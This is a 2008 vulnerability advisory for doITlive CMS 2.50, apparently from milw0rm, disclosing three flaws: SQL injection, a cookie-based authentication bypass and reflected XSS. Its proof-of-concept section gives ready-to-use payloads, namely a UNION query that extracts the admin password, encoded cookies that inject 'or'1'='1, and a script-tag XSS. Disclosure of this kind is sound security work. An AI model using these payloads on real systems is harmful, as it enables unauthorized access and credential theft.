@@ -1,0 +1,69 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: doITlive CMS <=2.50 (SQL Injection/XSS) Multiple Vulnerabilities
+# Vendor: www.doitlive.com
+# Vulnerable Version: 2.50 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/43
+###################################################################################
+
+####################
+1. Description:
+####################
+    User friendly Multiple website Site dynamic control system. Including a Content Management System for dynamic generation and publishing of information on Internet ? Extranet - Intranet. doITlive is an ASP powered back-end Multi-site, browser based management tool, Supporting MS Access & MS SQL databases.
+
+####################
+2. Vulnerabilities:
+####################
+    2.1. Injection Flaws. SQL Injection in "/default.asp" in "ID" parameter.
+        2.1.1. Exploit:
+                        Check the exploit/POC section.
+    2.2. Injection Flaws. SQL Injection in "/edit/default.asp" by cookie's parameters lead to bypass authentication (in remember user section).
+        2.2.1. Exploit:
+                        Check the exploit/POC section.
+    2.3. Cross Site Scripting (XSS). Reflected XSS attack in "/edit/showmedia.asp" in "File" parameter.
+        2.3.1. Exploit:
+                        Check the exploit/POC section.
+####################
+3. Exploits/POCs:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/43/exploit
+    3.1. SQL Injection in "/default.asp" in "ID" parameter.
+        -------------
+        Find Admin's password:
+        http://[URL]/default.asp?action=USUB&ID=-1%20union%20select%20username%2b'::'%2bpassword,1%20from%20w_user%20where%20username like '%25admin%25'&TYPE=MAIL
+        -------------
+    3.2. SQL Injection in "/edit/default.asp" by cookie's parameters lead to bypass authentication (in remember user section).
+        -------------
+        -Set these cookies:
+            Licence[SpecialLicenseNumber]=Username=b%21n8orijfeh7o9u28fqekyhh1jre&Password=b%21n8orpj%28e%287%289%282sf2e%3Ey2hi%28f%28h%28opu28%3Eq2ksh%281jre;
+        - In demo versions [SpecialLicenseNumber] = "" so we have:
+            LicenceId=Username=b%21n8orijfeh7o9u28fqekyhh1jre&Password=b%21n8orpj%28e%287%289%282sf2e%3Ey2hi%28f%28h%28opu28%3Eq2ksh%281jre;
+        - Parameters used for username and password in this cookie:
+            Decrypt('or'1'='1'or'1'='1) = %28rs12h%3Ek2qp8%28u%28o%28hhfyie2f%3E229s7%28e%28j%28r%288p
+            Decrypt(' or username like '%admin%' or username like '%admin%)= %28rp1%21htksqb8fumolh%21f%26ie%26jj%26e%21%26s%21vlfmofnb%21sjtf%21%28pb%28noonhby%28effj2%219n7oefjvrs8%21
+            Decrypt(admin) = b%21n8orijfeh7o9u28fqekyhh1jre
+            Decrypt(' or username like '%admin%) = %28%21p8%21rtjseb7f9m2lf%21e%26yehjo%26nibf%28hfoju%218nqokfhv1sr%21
+        -------------
+    3.3. Reflected XSS attack in "/edit/showmedia.asp" in "File" parameter.
+        -------------
+        http://[URL]/edit/showmedia.asp?FILE=<Script>alert('XSS by BugReport.IR')</script>"Bugreport.jpg
+        -------------
+
+####################
+4. Solution:
+####################
+    All the source codes are encoded. So, first of all, decode the source codes of "/default.asp","/edit/default.asp","/edit/showmedia.asp" by Microsoft Script Decoder (scrdec.exe). Then, edit the source code to ensure that inputs are properly sanitized (for 2.1, 2.2, 2.3).
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-18]
